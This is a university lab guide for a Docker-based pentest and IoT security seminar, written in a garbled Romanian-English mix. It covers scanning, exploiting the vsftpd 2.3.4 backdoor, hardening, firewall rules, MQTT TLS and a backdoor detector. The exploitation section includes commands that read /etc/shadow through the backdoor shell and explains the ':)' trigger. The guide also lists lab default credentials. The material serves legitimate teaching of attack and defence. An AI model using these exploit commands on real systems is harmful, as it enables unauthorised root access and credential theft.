# Guide Complete: Scenarii of Laboratory - Week 13
## Securitya in Networksle of Calculatoare: IoT and Pentest

**Duration estimata**: 120 minute (2 ore)  
**Nivel dificultate**: Intermediar-Advanced  
**Lecture**: Computer Networks, ASE-CSIE, 2025-2026

---

## Cuprins

1. [Preparation and Verification Environment](#1-preparation-and-verification-environment)
2. [Scenariul A: Perspectiva Offensive (Red Team)](#2-scenariul-a-perspectiva-offensive-red-team)
3. [Scenariul B: Perspectiva Defensiva (Blue Team)](#3-scenariul-b-perspectiva-defensiva-blue-team)
4. [Scenariul C: MQTT and IoT](#4-scenariul-c-mqtt-and-iot)
5. [Scenariul D: Segmentare and Firewall](#5-scenariul-d-segmentare-and-firewall)
6. [Exercises Individuale](#6-exercises-individuale)
7. [Generation Report](#7-generation-report)
8. [Troubleshooting](#8-troubleshooting)

---

## 1. Preparation and Verification Environment

### 1.1 Requirements System

```bash
# Verification versiuni
python3 --version    # >= 3.8
docker --version     # >= 20.10
docker-compose --version  # >= 1.29

# Verification user in grupul docker
groups | grep -q docker && echo "OK: docker group" || echo "WARN: add user to docker group"
```

### 1.2 Installation and Start

```bash
# Navigare in directorul starterkit
cd starterkit_s13

# Complete installation (Python dependencies + Docker images)
make setup

# Verification installation
make check
```

**Output Expected**:
```
[✓] Python 3.x detected
[✓] Docker running
[✓] Docker Compose available
[✓] Required Python packages installed
[✓] Docker images available
```

### 1.3 Start Infrastructura

```bash
# Varianta completa (all servicesle)
make start-all

# Or selectiv:
make docker-up      # Only containere vulnerabile
make mininet-base   # Only topology Mininet simpla
make mqtt-start     # Only broker MQTT
```

### 1.4 Verification Services Activee

```bash
# Verification containere
docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}"

# Test conectivitate
curl -s http://localhost:8888 | head -5    # DVWA
curl -s http://localhost:8080 | head -5    # WebGoat
nc -vz localhost 2121                       # vsftpd
nc -vz localhost 1883                       # MQTT plain
```

**Topologia Completa**:
```
┌─────────────────────────────────────────────────────────────────────────┐
│                         INFRASTRUCTURA LAB S13                          │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│   ┌─────────────────┐                      ┌─────────────────────┐      │
│   │  ATTACKER HOST  │                      │    MININET TOPO     │      │
│   │  (Terminal)     │                      │  ┌───────────────┐  │      │
│   │  Python scripts │                      │  │   Controller  │  │      │
│   └────────┬────────┘                      │  └───────┬───────┘  │      │
│            │                               │          │          │      │
│   ┌────────┴───────────────────────────────┼──────────┘          │      │
│   │           DOCKER NETWORK               │                     │      │
│   │           pentestnet                   │    ┌─────┐ ┌─────┐  │      │
│   │           172.20.0.0/24                │    │ s1  │ │ s2  │  │      │
│   └───────────────┬────────────────────────┼────┴──┬──┴─┴──┬──┴──│      │
│                   │                        │       │       │     │      │
│     ┌─────────────┼─────────────┐          │    ┌──┴──┐ ┌──┴──┐  │      │
│     │             │             │          │    │ h1  │ │ h2  │  │      │
│  ┌──┴───┐   ┌────┴───┐   ┌────┴───┐       │    │IoT  │ │MGMT │  │      │
│  │ DVWA │   │WebGoat │   │ vsftpd │       │    └─────┘ └─────┘  │      │
│  │:8888 │   │ :8080  │   │ :2121  │       └─────────────────────┘      │
│  │ SQLi │   │ OWASP  │   │CVE-2011│                                    │
│  │ XSS  │   │Lessons │   │ -2523  │       ┌─────────────────────┐      │
│  └──────┘   └────────┘   └────────┘       │   MQTT ECOSYSTEM    │      │
│                                           │  ┌───────────────┐  │      │
│  ┌──────────────────────────────────┐     │  │  Mosquitto    │  │      │
│  │         ATTACKER TOOLS           │     │  │  :1883 plain  │  │      │
│  │  • Port Scanner                  │     │  │  :8883 TLS    │  │      │
│  │  • Banner Grabber                │     │  └───────┬───────┘  │      │
│  │  • Packet Sniffer                │     │          │          │      │
│  │  • Vuln Checker                  │     │   ┌──────┼──────┐   │      │
│  │  • FTP Backdoor Exploit          │     │   │ Pub  │ Sub  │   │      │
│  └──────────────────────────────────┘     │   └──────┴──────┘   │      │
│                                           └─────────────────────┘      │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 2. Scenariul A: Perspectiva Offensive (Red Team)

### Obiectiv
Identify and exploatati vulnerabilities in infrastructura of test using metodologia of penetration testing in 4 faze.

### Faza A.1: Recunoastere (15 minute)

#### A.1.1 Discovery Hosts

```bash
# Scanning network for discovery
python python/exercises/ex_01_port_scanner.py 172.20.0.0/24 \
    --discovery \
    --timeout 0.5
```

#### A.1.2 Scanning Ports

```bash
# Scanning comprehensiva on target-uri identificate
python python/exercises/ex_01_port_scanner.py 172.20.0.10 \
    -p 1-1024 \
    --threads 50 \
    -o results/scan_dvwa.json

python python/exercises/ex_01_port_scanner.py 172.20.0.12 \
    -p 21,22,80,443,6200 \
    -o results/scan_vsftpd.json
```

**Output of Analizat**:
```
[*] Scanning 172.20.0.12 (5 ports)
[+] 172.20.0.12:21     OPEN   (ftp)
[+] 172.20.0.12:6200   OPEN   (unknown)
[-] 172.20.0.12:22     CLOSED
[-] 172.20.0.12:80     CLOSED
[-] 172.20.0.12:443    CLOSED

Scan completed in 2.34s
```

**Intrebare**: What semnifica portul 6200 open on serverul FTP?

#### A.1.3 Banner Grabbing

```bash
# Extragere information versiuni
python python/exploits/banner_grabber.py 172.20.0.12 -p 21
python python/exploits/banner_grabber.py 172.20.0.10 -p 80
python python/exploits/banner_grabber.py 172.20.0.11 -p 8080
```

**Colectare Results**:
| Target | Port | Banner | Version |
|--------|------|--------|----------|
| 172.20.0.12 | 21 | 220 (vsFTPd 2.3.4) | 2.3.4 |
| 172.20.0.10 | 80 | Apache/2.4.xx | 2.4.xx |
| 172.20.0.11 | 8080 | WebGoat | N/A |

### Faza A.2: Evaluation Vulnerabilities (15 minute)

#### A.2.1 Verification CVE

```bash
# Verification automata vulnerabilities cunoscute
python python/exercises/ex_04_vuln_checker.py \
    --targets 172.20.0.10,172.20.0.11,172.20.0.12 \
    --ports 21,80,8080 \
    --check-cve \
    -o results/vuln_report.json
```

#### A.2.2 Analysis Manuala

```bash
# Verification specify vsftpd
python python/exercises/ex_04_vuln_checker.py \
    --target 172.20.0.12 \
    --service ftp \
    --version "2.3.4" \
    --verbose
```

**Output Expected**:
```
[CRITICAL] CVE-2011-2523 detected!
Service: vsftpd 2.3.4
Type: Backdoor (smiley face trigger)
CVSS Score: 10.0 (CRITICAL)
Impact: Remote Code Execution as root
Exploit Available: YES

Recommendation: Upgrade to vsftpd >= 2.3.5 immediately
```

### Faza A.3: Exploatare (20 minute)

⚠ **ATENTIE**: This sectiune is ONLY for medii of laboratory controlate!

#### A.3.1 Demonstration Exploit vsftpd

```bash
# Terminal 1: Start capture traffic
make capture-start IF=docker0 FILTER="port 21 or port 6200"

# Terminal 2: Execution exploit
python python/exploits/ftp_backdoor_vsftpd.py 172.20.0.12 \
    --port 2121 \
    --command "id && hostname && uname -a"
```

**Explicatie Tehnica**:
1. Exploit-ul send `USER test:)` (observati `:)` - trigger-ul backdoor)
2. vsftpd 2.3.4 deschide un shell on portul 6200
3. Attackatorul se connect on 6200 and receive acces root

#### A.3.2 Analysis Capture

```bash
# Stop capture
make capture-stop

# Analysis
./scripts/capture_traffic.sh --analyze captures/capture_latest.pcap
```

**Identify in Wireshark**:
1. Packetul FTP with `USER test:)` (filtru: `ftp.request.command == "USER"`)
2. Connection noua on portul 6200 (filtru: `tcp.port == 6200`)
3. Commandsle executate in shell (Follow TCP Stream)

### Faza A.4: Post-Exploatare (10 minute)

#### A.4.1 Demonstration Acces

```bash
# What can face un attacker with acces root?
python python/exploits/ftp_backdoor_vsftpd.py 172.20.0.12 \
    --port 2121 \
    --command "cat /etc/shadow | head -3"

python python/exploits/ftp_backdoor_vsftpd.py 172.20.0.12 \
    --port 2121 \
    --command "netstat -tlnp"
```

#### A.4.2 Documentare Gasiri

Completati in report:
- Vulnerabilities identificate
- Steps of reproducere
- Dovezi (screenshots, outputs)
- Severitate (CVSS)
- Recommandri

---

## 3. Scenariul B: Perspectiva Defensiva (Blue Team)

### Obiectiv
Implement and verificati masuri of security for a preveni attackurile demonstrate in Scenariul A.

### Faza B.1: Hardening vsftpd (15 minute)

#### B.1.1 Configuration Securizata

```bash
# Vizualizare configuration actuala (vulnerabila)
cat configs/vsftpd/vsftpd.conf

# Aplicare configuration hardened
cat > configs/vsftpd/vsftpd_secure.conf << 'EOF'
# vsftpd Hardened Configuration
# ============================

# Dezactiveare acces anonim
anonymous_enable=NO
local_enable=YES

# Restrictii writere
write_enable=NO
anon_upload_enable=NO
anon_mkdir_write_enable=NO

# Chroot users in home
chroot_local_user=YES
allow_writeable_chroot=NO

# Logging extensiv
xferlog_enable=YES
xferlog_std_format=NO
log_ftp_protocol=YES
syslog_enable=YES

# Timeout-uri agresive
idle_session_timeout=60
data_connection_timeout=30

# Banner neutru (without version)
ftpd_banner=FTP Server Ready

# Restrictii connections
max_clients=10
max_per_ip=3

# Dezactiveare PASV (or restrictionare range)
pasv_enable=NO
# pasv_min_port=50000
# pasv_max_port=50100

# SSL/TLS mandatory
ssl_enable=YES
force_local_data_ssl=YES
force_local_logins_ssl=YES
ssl_tlsv1=YES
ssl_sslv2=NO
ssl_sslv3=NO
rsa_cert_file=/etc/ssl/certs/vsftpd.pem
rsa_private_key_file=/etc/ssl/private/vsftpd.key
EOF
```

#### B.1.2 Upgrade Version (Solutia Reala)

```bash
# In productie, solutia corecta is upgrade
# vsftpd >= 2.3.5 not are backdoor-ul

# Verification version noua
apt-cache policy vsftpd
```

### Faza B.2: Configuration Firewall (15 minute)

#### B.2.1 Reguli iptables

```bash
# Save reguli existente
iptables-save > /tmp/iptables_backup

# Aplicare reguli restrictive
cat > /tmp/firewall_rules.sh << 'EOF'
#!/bin/bash
# Firewall rules for environment lab

# Flush reguli existente
iptables -F
iptables -X

# Politica implicita: DROP
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# Allowre traffic loopback
iptables -A INPUT -i lo -j ACCEPT

# Allowre connections stabilite
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# SSH only from subnet-ul of management
iptables -A INPUT -p tcp --dport 22 -s 10.0.1.0/24 -j ACCEPT

# HTTP/HTTPS for applications web
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# FTP restrictionat (only from networkua interna)
iptables -A INPUT -p tcp --dport 21 -s 172.20.0.0/24 -j ACCEPT

# MQTT TLS allowed, plain blocked
iptables -A INPUT -p tcp --dport 8883 -j ACCEPT
iptables -A INPUT -p tcp --dport 1883 -j DROP

# Blocare port backdoor
iptables -A INPUT -p tcp --dport 6200 -j DROP
iptables -A OUTPUT -p tcp --dport 6200 -j DROP

# Logging packets blockede
iptables -A INPUT -j LOG --log-prefix "IPTables-Dropped: "

echo "Firewall rules applied"
EOF

chmod +x /tmp/firewall_rules.sh
```

#### B.2.2 Verification Reguli

```bash
# Listare reguli activee
iptables -L -n -v

# Test ca portul 6200 e blocked
nc -vz localhost 6200  # Ar trebui sa esueze
```

### Faza B.3: TLS Implementation for MQTT (15 minute)

#### B.3.1 Generation Certificateses

```bash
# Generation CA and certificateses
make mqtt-certs

# Structura resulta:
# configs/certs/
# ├── ca.crt          # Certificateses Authority
# ├── ca.key          # CA private key
# ├── server.crt      # Certificateses server Mosquitto
# ├── server.key      # Key privata server
# ├── client.crt      # Certificateses client
# └── client.key      # Key privata client
```

#### B.3.2 Configuration Mosquitto with TLS

```bash
# Start broker with TLS
make mqtt-secure

# Verification ca portul plain e dezactiveat
nc -vz localhost 1883  # Ar trebui sa esueze
nc -vz localhost 8883  # Ar trebui sa reuseasca
```

#### B.3.3 Test Client TLS

```bash
# Publish securizata
python python/exercises/ex_02_mqtt_client.py \
    --broker localhost \
    --port 8883 \
    --tls \
    --ca-cert configs/certs/ca.crt \
    --mode sensor \
    --topic "iot/sensor/temp"

# Subscribe securizata (alt terminal)
python python/exercises/ex_02_mqtt_client.py \
    --broker localhost \
    --port 8883 \
    --tls \
    --ca-cert configs/certs/ca.crt \
    --mode dashboard \
    --topic "iot/sensor/#"
```

### Faza B.4: Monitoring and Detectie (10 minute)

#### B.4.1 Activeare Logging

```bash
# Configuration logging extins Mosquitto
cat > configs/mosquitto/logging.conf << 'EOF'
# Logging Configuration
log_dest file /var/log/mosquitto/mosquitto.log
log_dest stdout
log_type error
log_type warning
log_type notice
log_type information
log_type subscribe
log_type unsubscribe
connection_messages true
log_timestamp true
EOF
```

#### B.4.2 Start Sniffer IDS

```bash
# Monitoring in time real for anomalii
python python/exercises/ex_03_packet_sniffer.py \
    --interface docker0 \
    --filter "tcp port 21 or tcp port 6200" \
    --alert-on "USER.*:)" \
    --log results/ids_alerts.log
```

---

## 4. Scenariul C: MQTT and IoT

### Obiectiv
Understanding securitatii protocolslor IoT through practica with MQTT.

### Faza C.1: MQTT Plain (Vulnerabil) - 10 minute

#### C.1.1 Start Environment

```bash
# Start broker without security
make mqtt-plain

# Verification
mosquitto_pub -h localhost -p 1883 -t "test" -m "hello"
```

#### C.1.2 Interception Traffic

```bash
# Terminal 1: Capture
./scripts/capture_traffic.sh --protocol mqtt-plain --duration 60

# Terminal 2: Generation traffic
python python/exercises/ex_02_mqtt_client.py \
    --broker localhost --port 1883 \
    --mode sensor --count 10
```

#### C.1.3 Analysis

```bash
# Vizualizare payload in clar
./scripts/capture_traffic.sh --analyze captures/mqtt_plain_*.pcap

# In Wireshark: Filtru "mqtt"
# Observati: topic-uri and messages vizibile plaintext
```

### Faza C.2: MQTT TLS (Securizat) - 10 minute

#### C.2.1 Start Securizata

```bash
# Start broker with TLS
make mqtt-secure

# Verification connection TLS
openssl s_client -connect localhost:8883 -CAfile configs/certs/ca.crt
```

#### C.2.2 Capture and Comparatie

```bash
# Terminal 1: Capture
./scripts/capture_traffic.sh --protocol mqtt-tls --duration 60

# Terminal 2: Generation traffic TLS
python python/exercises/ex_02_mqtt_client.py \
    --broker localhost --port 8883 \
    --tls --ca-cert configs/certs/ca.crt \
    --mode sensor --count 10
```

#### C.2.3 Observatii

```bash
# Analysis
./scripts/capture_traffic.sh --analyze captures/mqtt_tls_*.pcap

# In Wireshark: Filtru "tcp.port == 8883"
# Observati: payload CRIPTAT, only handshake TLS vizibil
```

### Faza C.3: Authentication and ACL - 10 minute

#### C.3.1 Configuration Users

```bash
# Vizualizare ACL
cat configs/mosquitto/acl.acl

# Structura:
# user sensor1: can publica on iot/sensor/+
# user controller: can subwrite at iot/# and publica on iot/actuator/#
# user admin: full access
```

#### C.3.2 Test Allowediuni

```bash
# Test ca sensor (ar trebui sa reuseasca)
mosquitto_pub -h localhost -p 8883 \
    --cafile configs/certs/ca.crt \
    -u sensor1 -P sensor1pass \
    -t "iot/sensor/temp" -m "25.5"

# Test ca sensor on topic neauthorised (ar trebui sa esueze)
mosquitto_pub -h localhost -p 8883 \
    --cafile configs/certs/ca.crt \
    -u sensor1 -P sensor1pass \
    -t "iot/actuator/relay" -m "ON"
# Error: Not authorized
```

---

## 5. Scenariul D: Segmentare and Firewall

### Obiectiv
Implementing principiului Defense in Depth through segmentare of network with Mininet.

### Faza D.1: Topology Simpla - 10 minute

```bash
# Start topology baza
make mininet-base

# In CLI Mininet:
mininet> nodes
mininet> net
mininet> pingall
```

### Faza D.2: Topology Segmentata - 15 minute

```bash
# Start topology with firewall
make mininet-segmented

# Testing segmentare:
mininet> h1 ping -c 2 h3    # IoT -> IoT: PERMIS
mininet> h1 ping -c 2 h5    # IoT -> MGMT: BLOCAT
mininet> h5 ping -c 2 h1    # MGMT -> IoT: PERMIS (admin)
```

### Faza D.3: Demonstration Firewall - 10 minute

```bash
# Running demo interactive
./scripts/run_demo_defensive.sh --scenario all --interactivee

# Scenarii demonstrate:
# 1. Izolare zona IoT
# 2. Prevenire miscare laterala
# 3. Acces administrare controlat
# 4. Blocare port scan
```

---

## 6. Exercises Individuale

### Exercitiu 1: Port Scanner Personalizat (15 minute)

**Cerinta**: Modificati `ex_01_port_scanner.py` for a adauga:
1. Detection system of operare through TTL
2. Export results in format XML (nmap-style)

**Steps**:
```bash
# Deschideti fisierul
vim python/exercises/ex_01_port_scanner.py

# Gasiti sectiunea TODO for studenti
# Implement functia os_fingerprint()

# Test
python python/exercises/ex_01_port_scanner.py 172.20.0.10 \
    -p 80 --os-detect -o results/scan_os.xml --format xml
```

### Exercitiu 2: Detector Backdoor (15 minute)

**Cerinta**: Creati un script which detect tentative of exploatare vsftpd.

**Template**:
```python
#!/usr/bin/env python3
"""
Detector for tentative of exploatare vsftpd 2.3.4
Monitor trafficul FTP for pattern-ul ":)"
"""

from scapy.all import sniff, TCP, Raw
import re

def detect_backdoor(packet):
    """Callback for detectare pattern backdoor."""
    if packet.haslayer(Raw):
        payload = packet[Raw].load.decode('utf-8', errors='ignore')
        # TODO: Implement detectarea pattern-ului "USER.*:)"
        # TODO: Alerta if se detect and connection on portul 6200
        pass

if __name__ == "__main__":
    print("[*] Starting backdoor detector...")
    sniff(filter="tcp port 21", prn=detect_backdoor)
```

### Exercitiu 3: Report of Security (15 minute)

**Cerinta**: Generati un report complete using tool-ul of raportare.

```bash
# Colectare date
python python/utils/report_generator.py \
    --scan-results results/scan_*.json \
    --vuln-results results/vuln_report.json \
    --captures captures/*.pcap \
    --output results/security_report \
    --format all \
    --template professional
```

---

## 7. Generation Report

### 7.1 Structura Raportului Final

```bash
# Generation report HTML interactive
python python/utils/report_generator.py \
    --title "Report Security Lab S13" \
    --author "[Numele vostru]" \
    --date "$(date +%Y-%m-%d)" \
    --scan-results results/ \
    --output results/RAPORT_FINAL \
    --format html,md,pdf
```

### 7.2 Content Mandatory

```markdown
# Report Security - Seminar 13

## 1. Sumar Executiv
- Scope: [What a fost tested]
- Metodologie: [How a fost tested]
- Gasiri principale: [Top 3 vulnerabilities]

## 2. Gasiri Detaliate

### 2.1 Vulnerability Critica: vsftpd Backdoor
- **Severitate**: CRITICA (CVSS 10.0)
- **CVE**: CVE-2011-2523
- **Dewritere**: [...]
- **Dovada**: [Screenshot/output]
- **Remediation**: Upgrade at vsftpd >= 2.3.5

### 2.2 Vulnerability Medie: MQTT without TLS
- **Severitate**: MEDIE (CVSS 5.3)
- **Dewritere**: [...]
- **Remediation**: Activeare TLS, configuration ACL

## 3. Recommandri
1. [Prioritate 1 - Critica]
2. [Prioritate 2 - Ridicata]
3. [Prioritate 3 - Medie]

## 4. Anexe
- Scanari complete
- Captures traffic
- Configurations propuse
```

### 7.3 Export Final

```bash
# Archiving for predare
make package-results

# Verification content
ls -at results/SUBMISSION_S13_*.zip
unzip -l results/SUBMISSION_S13_*.zip
```

---

## 8. Troubleshooting

### 8.1 Frequent Problems

| Symptom | Cauza Probabila | Solution |
|---------|-----------------|---------|
| `Connection refused` at Docker | Containere nefunctionale | `make docker-restart` |
| `Allowedsion denied` at scan | Lipsa drepturi | `sudo` or adaugare at grup docker |
| `Modules not found` Python | Dependencies lipsa | `make setup` |
| Mininet not start | Processes reziduale | `sudo mn -c && make mininet-base` |
| MQTT connection timeout | Broker oprit | `make mqtt-start` |
| TLS handshake failed | Certificateses invalide | `make mqtt-certs` (regenerare) |
| Port 6200 not raspunde | vsftpd resetat | `docker-compose restart vsftpd` |

### 8.2 Commands of Diagnosticare

```bash
# Verification complete
make check

# State containere
docker ps -a
docker-compose logs --tail=50

# Verification ports
ss -tlnp | grep -E "21|80|1883|8080|8883"

# Verification network Docker
docker network inspect pentestnet

# Cleanup completa and repornire
make clean-all && make start-all
```

### 8.3 Reset Complete

```bash
# If nimic not functioneaza
./scripts/cleanup.sh --all --force
docker system prune -a --volumes
make setup
make start-all
```

---

## Anexa: Referinte Rapide

### Commands Make Esentiale

```bash
make setup          # Installation initiala
make start-all      # Start completa
make docker-up      # Only containere
make mqtt-start     # Only MQTT
make mininet-base   # Simple topology
make scan TARGET=X  # Scanning rapida
make capture-start  # Start tcpdump
make report         # Generation report
make clean-all      # Cleanup completa
make help           # Lista completa
```

### Addresses IP

| Service | IP | Port(uri) |
|----------|----|----|
| DVWA | 172.20.0.10 | 80 (intern), 8888 (extern) |
| WebGoat | 172.20.0.11 | 8080 |
| vsftpd | 172.20.0.12 | 21 (intern), 2121 (extern), 6200 (backdoor) |
| Mosquitto | 172.20.0.100 | 1883 (plain), 8883 (TLS) |

### Credentials

| Service | Username | Password |
|----------|----------|----------|
| DVWA | admin | password |
| WebGoat | (register) | (register) |
| vsftpd | anonymous | (any) |
| MQTT sensor1 | sensor1 | sensor1pass |
| MQTT admin | admin | adminpass |

---

*Document updated for Seminar 13 - Computer Networks*  
*ASE Bucharest, CSIE, 2025-2026*
